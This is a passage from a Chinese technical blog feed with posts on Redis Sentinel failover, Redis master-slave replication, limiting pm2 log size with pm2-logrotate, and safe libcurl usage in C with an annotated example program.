可以发现当 <code>Sentinel</code> 实例启动时 <code>Sentinel</code> 的配置文件会自动进行更新，记录 <code>Slave</code> 及其它 <code>Sentinel</code> 的信息。
</p></li>

<li><p>
从 <code>Sentinel</code> 获取当前 <code>Master</code> 的地址
</p>

<p>
通过 <code>redis-cli</code> 连上任一 <code>Sentinel</code> <code>redis-cli -p 5000</code>
</p>

<pre class="example">
127.0.0.1:5000&gt; sentinel get-master-addr-by-name mymaster
1) "127.0.0.1"
2) "6379"
</pre></li>

<li><p>
故障切换测试
</p>

<p>
让 <code>Master</code> 停止响应 <code>30</code> 秒 <code>redis-cli -p 6379 debug sleep 30</code>
</p>

<p>
约 <code>10</code> 秒钟后，通过 <code>Sentinel</code> 的日志输出看到发生了主从切换。
</p>

<p>
重新获取当前的 <code>Master</code>
</p>

<pre class="example">
127.0.0.1:5000&gt; sentinel get-master-addr-by-name mymaster
1) "127.0.0.1"
2) "6380"
</pre>

<p>
<code>Redis</code> 实例的配置文件被自动修正，以反映新的 <code>Master-Slave</code> 状态：
</p>

<p>
<code>redis-master.conf</code> 添加了配置行 <code>slaveof 127.0.0.1 6380</code>
</p>

<p>
<code>redis-slave.conf</code> 删除了配置行 <code>slaveof 127.0.0.1 6379</code>
</p>

<p>
和我们在上一篇文章《 <a href="http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html">redis高可用性基础：Master-Slave</a> 》手工做的主备切换如出一辙。
</p>

<p>
三个 <code>Sentinel</code> 配置文件中的 <code>Master-Slave</code> 配置也被自动修正。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgc171379" class="outline-2">
<h2 id="orgc171379">疑问</h2>
<div class="outline-text-2" id="text-orgc171379">
<ul class="org-ul">
<li><p>
<code>Redis</code> 实例的配置文件是被谁修改的？
</p>

<p>
如果是 <code>Sentinel</code> 那么就意味着所有 <code>Redis</code> 实例的同一机器上必须配置有 <code>Sentinel</code> （《<a href="http://redis.io/topics/sentinel">Redis Sentinel Documentation – Redis</a>》未提及）。
</p></li>

<li><p>
万一因为某种原因，原 <code>Master</code> 配置文件未改为 <code>Slave</code> ，会不会出现脑裂？
</p>

<p>
感觉应该是会出现脑裂的，但是只要客户端应用总是使用 <code>Sentinel</code> 提供的 <code>Master</code> 地址，就不会有问题。
</p>

<p>
<code>node.js</code> 访问单个 <code>redis</code> 实例已经用得很溜了，下一篇文章会研究 <code>node.js</code> 访问 <code>redis sentinel</code> ，相信答案就会水落石出了。
</p></li>

<li><p>
<code>Redis Sentinel</code> 能保证不丢数据吗？
</p>

<p>
不能。由于 <code>Redis</code> 是异步复制，没有办法防止数据丢失，假设配置如下：
</p>

<pre class="example">
min-slaves-to-write 1
min-slaves-max-lag 10
</pre>

<p>
假设出现了分裂（partition）， <code>Master</code> 要 <code>10</code> 秒钟后才发现 <code>Slave</code> 失联再禁止写入，当分裂消除（partition heals）， 旧 <code>Master</code> 做为 <code>Slave</code> 连上新的 <code>Master</code> ，这 <code>10</code> 秒钟内写入的数据不会合入（merge）新的 <code>Master</code> ，数据丢失了。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org1ae46d6" class="outline-2">
<h2 id="org1ae46d6">参考</h2>
<div class="outline-text-2" id="text-org1ae46d6">
<p>
<a href="http://redis.io/topics/sentinel">Redis Sentinel Documentation – Redis</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[redis高可用性基础：Master-Slave]]></title>
            <link>/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html</link>
            <guid>/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html</guid>
            <pubDate>Fri, 25 Dec 2015 13:19:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org3baf8a6" class="outline-2">
<h2 id="org3baf8a6">理解Master-Slave</h2>
<div class="outline-text-2" id="text-org3baf8a6">
<p>
<code>Master-Slave</code> 常常翻译为 <code>主/备</code> ，是一种高可用性（ <a href="https://en.wikipedia.org/wiki/High_availability">High Availability</a> ）方案。
</p>

<p>
举个生活中的 <code>Master-Slave</code> 例子：
</p>

<blockquote>
<p>
参加考试的时候，我们会准备两支钢笔，正常情况下我们只会使用一支，出问题了才会换另外一支。
</p>
</blockquote>

<p>
所以实施 <code>Master-Slave</code> 是有成本的，至少会有 <code>50%</code> 的资源浪费（多备几支浪费会更多），可以让 <code>Slave</code> 承担一部分工作来充分利用资源。
</p>
</div>
</div>

<div id="outline-container-org5384c18" class="outline-2">
<h2 id="org5384c18">Redis的Master-Slave</h2>
<div class="outline-text-2" id="text-org5384c18">
<p>
关于 <code>Redis</code> 的 <code>Master-Slave</code> ，《<a href="http://redis.io/topics/replication">Replication – Redis</a>》 有详尽描述。
</p>

<p>
需要注意的是 <code>Redis</code> 的 <code>Master-Slave</code> 不能保证绝对不丢数据，而是丢失一小段时间内（如：1秒钟）的数据。
</p>

<p>
下面开始 <code>Redis</code> 的 <code>Master-Slave</code> 实践，使用的 <code>redis</code> 版本为 <code>3.0.6</code> 。
</p>
</div>

<div id="outline-container-org6735daa" class="outline-3">
<h3 id="org6735daa">创建Master结点</h3>
<div class="outline-text-3" id="text-org6735daa">
<ul class="org-ul">
<li><p>
redis配置文件
</p>

<p>
从 <code>/etc/redis.conf</code> 拷贝一份进行修改，无关的配置项已去掉，使用默认值即可。
</p>

<p>
<a href="../static/redis-master.conf">redis-master.conf</a>
</p></li>

<li><p>
在终端 <code>1</code> 启动 <code>Master</code> 结点
</p>

<p>
<code>redis-server ./redis-master.conf</code>
</p></li>

<li><p>
使用 <code>redis-cli</code> 连接 <code>Master</code>
</p>

<pre class="example">
$ redis-cli -p 6379
127.0.0.1:6379&gt;
</pre></li>
</ul>
</div>
</div>

<div id="outline-container-org90974c4" class="outline-3">
<h3 id="org90974c4">创建Slave结点</h3>
<div class="outline-text-3" id="text-org90974c4">
<ul class="org-ul">
<li><p>
redis配置文件
</p>

<p>
从 <code>redis-master.conf</code> 拷贝一份进行修改，主要是修改监听的端口号（ <code>6380</code> ）、PID文件名、DB文件名，
</p>

<p>
最关键的是设置为 <code>Master</code> 的 <code>Slave</code> <code>slaveof 127.0.0.1 6379</code> 。
</p>

<p>
<a href="../static/redis-slave.conf">redis-slave.conf</a>
</p></li>

<li><p>
在终端 <code>2</code> 启动 <code>Slave</code> 结点
</p>

<p>
<code>redis-server ./redis-slave.conf</code>
</p></li>

<li><p>
使用 <code>redis-cli</code> 连接 <code>Slave</code>
</p>

<pre class="example">
$ redis-cli -p 6380
127.0.0.1:6380&gt;
</pre></li>
</ul>
</div>
</div>

<div id="outline-container-orga86537b" class="outline-3">
<h3 id="orga86537b">演示Master写Slave读的场景</h3>
<div class="outline-text-3" id="text-orga86537b">
<ul class="org-ul">
<li><p>
在 <code>Master</code> 写入
</p>

<pre class="example">
127.0.0.1:6379&gt; set hello world
OK
</pre></li>

<li><p>
从 <code>Slave</code> 读取
</p>

<pre class="example">
127.0.0.1:6380&gt; get hello
"world"
</pre></li>
</ul>
</div>
</div>

<div id="outline-container-org93047e8" class="outline-3">
<h3 id="org93047e8">演示Slave挂掉的场景</h3>
<div class="outline-text-3" id="text-org93047e8">
<ul class="org-ul">
<li><p>
关闭 <code>Slave</code> 
</p>

<pre class="example">
127.0.0.1:6380&gt; shutdown
not connected&gt;
</pre>

<p>
终端 <code>2</code> 上的 <code>redis-server</code> 会自动退出，注意到它退出前进行了存盘。
</p></li>

<li><p>
在 <code>Master</code> 写入
</p>

<pre class="example">
127.0.0.1:6379&gt; set hello redis
OK
</pre></li>

<li><p>
在终端 <code>2</code> 上再次启动 <code>Slave</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">redis-server ./redis-slave.conf
</pre>
</div>

<p>
从日志上可以看到 <code>Slave</code> 从 <code>Master</code> 重新进行了数据同步。
</p></li>

<li><p>
在 <code>Slave</code> 上读取
</p>

<pre class="example">
not connected&gt; get hello
"redis"
127.0.0.1:6380&gt; 
</pre></li>
</ul>
</div>
</div>

<div id="outline-container-org488dfbc" class="outline-3">
<h3 id="org488dfbc">演示Master挂掉的场景</h3>
<div class="outline-text-3" id="text-org488dfbc">
<ul class="org-ul">
<li><p>
关闭 <code>Master</code>
</p>

<pre class="example">
127.0.0.1:6379&gt; shutdown
not connected&gt;
</pre>

<p>
终端 <code>1</code> 上的 <code>redis-server</code> 会自动退出，注意到它退出前进行了存盘， 终端 <code>2</code> 上的 <code>Slave</code> 在不断尝试重连 <code>Master</code> 。
</p></li>

<li><p>
Master-Slave角色切换
</p>

<p>
将运行中的原 <code>Slave</code> 提升为新 <code>Master</code>
</p>

<pre class="example">
127.0.0.1:6380&gt; slaveof no one
OK
</pre>

<p>
修改原 <code>Slave</code> 的配置文件 <code>redis-slave.conf</code> 删除配置 <code>#slaveof 127.0.0.1 6379</code>
</p>

<p>
修改原 <code>Master</code> 的配置文件 <code>redis-master.conf</code> 添加配置 <code>slaveof 127.0.0.1 6380</code>
</p></li>

<li><p>
在新 <code>Master</code> 写入
</p>

<pre class="example">
127.0.0.1:6380&gt; set hello master-slave
OK
</pre></li>

<li><p>
在终端 <code>1</code> 上再次启动原 <code>Master</code> 
</p>

<div class="org-src-container">
<pre class="src src-sh">redis-server ./redis-master.conf
</pre>
</div>

<p>
从日志上可以看到它现在是 <code>Slave</code> 角色了，反而从原 <code>Slave</code> 同步数据。
</p></li>

<li><p>
在原 <code>Master</code> 上读取
</p>

<pre class="example">
not connected&gt; get hello
"master-slave"
127.0.0.1:6379&gt;
</pre></li>
</ul>
</div>
</div>

<div id="outline-container-orgf9118bf" class="outline-3">
<h3 id="orgf9118bf">总结</h3>
<div class="outline-text-3" id="text-orgf9118bf">
<p>
<code>Redis</code> 的 <code>Master-Slave</code> 是一种动态关系，角色（ <code>Master</code> 、 <code>Slave</code> ）会互相转换，角色转换过程中必须严格按照步骤来，操作不当可能导致数据丢失。
</p>

<p>
后面会发文介绍自动进行这种切换的工具 <code>Redis Sentinel</code> ，以及当 <code>Master-Slave</code> 发生切换后，应用程序该如何重连到新的 <code>Master</code> 。
</p>
</div>
</div>
</div>

<div id="outline-container-org7145c97" class="outline-2">
<h2 id="org7145c97">参考</h2>
<div class="outline-text-2" id="text-org7145c97">
<p>
<a href="https://en.wikipedia.org/wiki/Master/slave_(technology)">Master/slave (technology) - Wikipedia, the free encyclopedia</a>
</p>

<p>
<a href="http://redis.io/topics/replication">Replication – Redis</a>
</p>

<p>
<a href="http://www.tuicool.com/articles/2QbABj">Redis slave切换为master操作（不停机） - 推酷</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[控制pm2的日志文件大小]]></title>
            <link>/article/63a75236-pm2-768465e55fd765874ef659275c0f.html</link>
            <guid>/article/63a75236-pm2-768465e55fd765874ef659275c0f.html</guid>
            <pubDate>Fri, 25 Dec 2015 10:41:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
下班前发现线上服务器的 <code>100G</code> 磁盘只有 <code>10%</code> 空闲空间了，检查了一下是 <code>pm2</code> 的日志文件（在 <code>~/.pm2/logs</code> 目录下）占用的。
</p>

<p>
参考帖子 <a href="https://github.com/Unitech/pm2/issues/535">Limit logs size? · Issue #535 · Unitech/pm2</a> 安装 <a href="https://www.npmjs.com/package/pm2-logrotate">pm2-logrotate</a> <code>pm2 install pm2-logrotate</code> ，
</p>

<p>
安装完成后，观察到正在按时间切分成多个日志文件，但空闲空间在迅速减少，眼看就要低于 <code>5%</code> 了，要是磁盘满了会影响关键的 <code>redis</code> 数据库，
</p>

<p>
立即手工将日志文件全部删除，但是磁盘空闲空间在继续减少，明白是 <code>pm2</code> 或者 <code>pm2-logrotate</code> 打开了日志文件导致空间无法释放，
</p>

<p>
立即执行 <code>pm2 kill</code> ， 等 <code>crontab</code> 将服务重新拉起，一分钟后确认危机解决。好在这台服务器上的 <code>node.js</code> 服务都不是很关键，
</p>

<p>
没有造成太大影响，圣诞节快乐:)
</p>

<div id="outline-container-org56cb42a" class="outline-2">
<h2 id="org56cb42a">今天（2016-02-16）运维人员发现pm2的日志快占满磁盘</h2>
<div class="outline-text-2" id="text-org56cb42a">
<p>
<a href="https://www.npmjs.com/package/pm2-logrotate">pm2-logrotate</a> （当前版本为1.3.1） 默认情况下，并未限制日志文件数，旧的日志文件未自动删除释放空间，需要设置 retain 配置项：
</p>

<div class="org-src-container">
<pre class="src src-js">pm2 set pm2-logrotate:retain 100
</pre>
</div>

<p>
这样最多会保留 100 个日志文件。
</p>

<p>
max_size 配置项默认是 10MB，并不意味着切割出来的日志文件大小一定就是 10MB，而是检查时发现日志文件大小达到 max_size，则触发日志切割。
</p>

<p>
interval 和 interval_unit 配置项指定了按时间维度进行日志切割。
</p>

<p>
切割是指将日志文件内容移到名称为 &lt;project name&gt;-out__YYYY-MM-DD-HH-mm.log 的日志文件中，所以日志文件大小往往是超过 max_size 的。
</p>

<p>
由于默认配置 interval 为 1， interval_unit 为 DD，所以每天至少会切割一次日志，每分钟当发现日志大小超过 10MB，也会触发一次日志切割。
</p>

<p>
pm2-logrotate 现阶段小问题还是比较多的（详见项目的 <a href="https://github.com/pm2-hive/pm2-logrotate/issues">issues</a> ），如：
</p>

<ul class="org-ul">
<li><p>
日志文件日期始终是前一天，日志文件大小超过 max_size 触发日志切割时，文件名中的日期也为前一天不合理了。
</p>

<p>
详见 <a href="https://github.com/pm2-hive/pm2-logrotate/issues/18">Fast growing log files may be overwritten #18</a>
</p></li>

<li><p>
如果日志文件写得很快，切割时有可能因为日志文件名冲突，导致同名的旧日志文件被覆盖。
</p>

<p>
详见 <a href="https://github.com/pm2-hive/pm2-logrotate/issues/17">Rotated files date #17</a>
</p></li>

<li><p>
pm2 开启 merge_logs 时，日志会重复
</p>

<p>
详见 <a href="https://github.com/pm2-hive/pm2-logrotate/issues/14">logrotate rotate the log multiple times if merge_logs is true #14</a>
</p></li>

<li><p>
无法精确限制日志占用空间。
</p>

<p>
不过 logrotate 工具也不能，所以也不算是个严重的问题。
</p></li>
</ul>

<p>
更好的方式可能是使用操作系统的 logrotate 服务。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[安全使用libcurl的正确姿势]]></title>
            <link>/article/5b8951684f7f7528-libcurl-76846b63786e59ff52bf.html</link>
            <guid>/article/5b8951684f7f7528-libcurl-76846b63786e59ff52bf.html</guid>
            <pubDate>Mon, 21 Dec 2015 10:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在我们的项目中，数次遇到 <code>libcurl</code> 导致的应用程序崩溃问题，这里总结了一下使用 <code>libcurl</code> 的正确姿势。
</p>

<div class="org-src-container">
<pre class="src src-c"><span class="linenr"> 1: </span><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;curl/curl.h&gt;</span>
<span class="linenr"> 2: </span><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdint.h&gt;</span>
<span class="linenr"> 3: </span><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;string.h&gt;</span>
<span class="linenr"> 4: </span>
<span class="linenr"> 5: </span>
<span class="linenr"> 6: </span><span style="color: #b294bb;">#define</span> <span style="color: #f0c674;">RESPONSE_BODY_SIZE</span> 128
<span class="linenr"> 7: </span>
<span class="linenr"> 8: </span><span style="color: #b5bd68;">static</span> <span style="color: #81a2be;">size_t</span> <span style="color: #de935f;">write_function</span>(<span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">void</span> *<span style="color: #f0c674;">buffer</span>, <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">size_t</span> <span style="color: #f0c674;">size</span>, <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">size_t</span><span style="text-decoration: underline;"> </span><span style="color: #f0c674; text-decoration: underline;">nmemb</span><span style="text-decoration: underline;">, </span><span style="color: #81a2be; text-decoration: underline;">void</span><span style="text-decoration: underline;"> *</span><span style="color: #f0c674; text-decoration: underline;">user_p</span><span style="text-decoration: underline;">)</span>
<span class="linenr"> 9: </span>{
<span class="linenr">10: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">response_body</span> = (<span style="color: #81a2be;">char</span>*)user_p;
<span class="linenr">11: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">response_body_len</span> = strlen(response_body);
<span class="linenr">12: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">len</span> = size*nmemb;
<span class="linenr">13: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (len &gt; RESPONSE_BODY_SIZE - response_body_len - 1) {
<span class="linenr">14: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> len = RESPONSE_BODY_SIZE - response_body_len - 1;
<span class="linenr">15: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span id="coderef-curl_write_function_buffer" class="coderef-off"><span class="linenr">16: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> memcpy(response_body + response_body_len, buffer, len);</span>
<span id="coderef-curl_write_function_return" class="coderef-off"><span class="linenr">17: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> size*nmemb;</span>
<span class="linenr">18: </span>}
<span class="linenr">19: </span>
<span class="linenr">20: </span><span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
<span class="linenr">21: </span>{
<span class="linenr">22: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">url</span> = <span style="color: #8abeb7;">"http://www.example.com/dns_servers"</span>;
<span class="linenr">23: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">curl_slist</span> *<span style="color: #f0c674;">headers</span> = <span style="color: #81a2be;">NULL</span>;
<span class="linenr">24: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> headers = curl_slist_append(headers, <span style="color: #8abeb7;">"Content-Type: application/json"</span>);
<span class="linenr">25: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">request_body</span> = <span style="color: #8abeb7;">"{\"host\": \"8.8.8.8\", \"port\": 53}"</span>;
<span class="linenr">26: </span>
<span class="linenr">27: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">CURL</span> *<span style="color: #f0c674;">curl</span>;
<span class="linenr">28: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">CURLcode</span> <span style="color: #f0c674;">res</span>;
<span class="linenr">29: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">char</span> <span style="color: #f0c674;">response_body</span>[RESPONSE_BODY_SIZE] = {<span style="color: #8abeb7;">'\0'</span>};
<span class="linenr">30: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">long</span> <span style="color: #f0c674;">response_code</span> = 0;
<span class="linenr">31: </span>
<span class="linenr">32: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl = curl_easy_init();
<span class="linenr">33: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(curl) {
<span class="linenr">34: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_setopt(curl, CURLOPT_URL, url);
<span class="linenr">35: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
<span class="linenr">36: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_body);
<span class="linenr">37: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(request_body));
<span id="coderef-curl_nosignal" class="coderef-off"><span class="linenr">38: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);</span>
<span class="linenr">39: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
<span class="linenr">40: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
<span class="linenr">41: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_body);
<span class="linenr">42: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> res = curl_easy_perform(curl);
<span class="linenr">43: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (res == CURLE_OK) {
<span id="coderef-curl_response_code" class="coderef-off"><span class="linenr">44: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &amp;response_code<span style="text-decoration: underline;">);</span></span>
<span class="linenr">45: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span class="linenr">46: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(res != CURLE_OK) {
<span class="linenr">47: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"request to %s error(%d): %s"</span>, url, res, curl_easy_s<span style="text-decoration: underline;">trerror(res));</span>
<span class="linenr">48: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span class="linenr">49: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_easy_cleanup(curl);
<span class="linenr">50: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span class="linenr">51: </span>
<span class="linenr">52: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> curl_slist_free_all(headers);
<span class="linenr">53: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (response_code == 201) {
<span class="linenr">54: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"request to %s successful: %s\n"</span>, url, response_body);
<span class="linenr">55: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
<span class="linenr">56: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span class="linenr">57: </span>
<span class="linenr">58: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"request to %s response failed(%ld): %s\n"</span>, url, response_co<span style="text-decoration: underline;">de, response_body);</span>
<span class="linenr">59: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 1;
<span class="linenr">60: </span>}
</pre>
</div>

<p>
上面的示例代码要注意的地方：
</p>

<dl class="org-dl">
<dt>行 <a href="#coderef-curl_write_function_buffer" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-curl_write_function_buffer');" onmouseout="CodeHighlightOff(this, 'coderef-curl_write_function_buffer');">16</a></dt><dd>buffer不是 <code>\0</code> 结尾的</dd>

<dt>行 <a href="#coderef-curl_write_function_return" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-curl_write_function_return');" onmouseout="CodeHighlightOff(this, 'coderef-curl_write_function_return');">17</a></dt><dd>总是返回 <code>size*nmemb</code></dd>

<dt>行 <a href="#coderef-curl_nosignal" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-curl_nosignal');" onmouseout="CodeHighlightOff(this, 'coderef-curl_nosignal');">38</a></dt><dd><p>
总是设置这个选项
</p>

<p>
<code>libcurl</code> 不支持异步 <code>dns</code> 解析时，会通过 <code>signal</code> 的方式实现 <code>dns</code> 解析设置超时， <code>signal</code> 会导致多线程程序崩溃，后台服务通常都是多线程的，所以应该总是设置这个选项（但是 <code>libcurl</code> 不支持异步 <code>dns</code> 解析时，超时选项将被忽略）。
</p>

<p>
可以通过运行 <code>curl --version</code> 命令或调用 <code>curl_version</code> 函数查看 <code>libcurl</code> 是否支持异步 <code>dns</code> 解析，调用 <code>curl_version_info</code> 函数还可以获得具体的 <code>c-ares</code> 库版本号。
</p>

<p>
编译 <code>libcurl</code> 时，通过为  <code>configure</code> 指定 <code>--enable-threaded-resolver</code> 或 <code>--enable-ares</code> 选项启用异步 <code>dns</code> 解析。
</p></dd>

<dt>行 <a href="#coderef-curl_response_code" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-curl_response_code');" onmouseout="CodeHighlightOff(this, 'coderef-curl_response_code');">44</a></dt><dd><p>
状态响应码变量必须是 <code>long</code> 类型
</p>

<p>
否则会由于内存越界导致程序崩溃。
</p></dd>
</dl>


<p>
